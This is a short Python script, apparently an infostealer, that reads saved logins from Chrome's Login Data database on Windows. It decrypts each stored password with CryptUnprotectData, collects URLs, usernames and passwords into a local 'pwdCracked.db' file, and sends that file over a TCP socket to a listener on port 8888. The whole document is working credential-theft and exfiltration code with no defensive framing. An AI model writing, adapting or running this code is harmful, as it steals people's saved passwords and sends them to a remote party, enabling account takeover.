from os import getenv
import socket
import win32crypt
import sqlite3
import sys

host = socket.gethostbyname(socket.gethostname())
port = 8888

chromeConn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
retConn = sqlite3.connect("pwdCracked.db")
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect((host,port))
print("Connected to server.")
#Create cursors for the socket to execute SQL
chromeCursor = chromeConn.cursor()
retCursor = retConn.cursor()
#Execute SQL syntax
chromeCursor.execute("SELECT action_url, username_value, password_value FROM logins")
retCursor.execute("CREATE TABLE password(url,user,pwd)")
data = chromeCursor.fetchall()
total = len(data)
count = 1

for result in data:
    sys.stdout.write("\rProgress: [{:{}s}] {} of {} complete".format("#"*count,total,count,total))
    sys.stdout.flush()
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    url = result[0]
    username = result[1]
    if password:
        retCursor.execute("INSERT INTO password (url,user,pwd) VALUES (?,?,?)", (url,username,password))
        retConn.commit()
    count += 1

passfile = open("pwdCracked.db", "rb")
readfrompassfile = passfile.read()
clientSocket.sendall(readfrompassfile)
 
chromeConn.close()
retConn.close()
clientSocket.shutdown(socket.SHUT_WR)
print("\nSuccess.")
input("Press <Return> to close...")
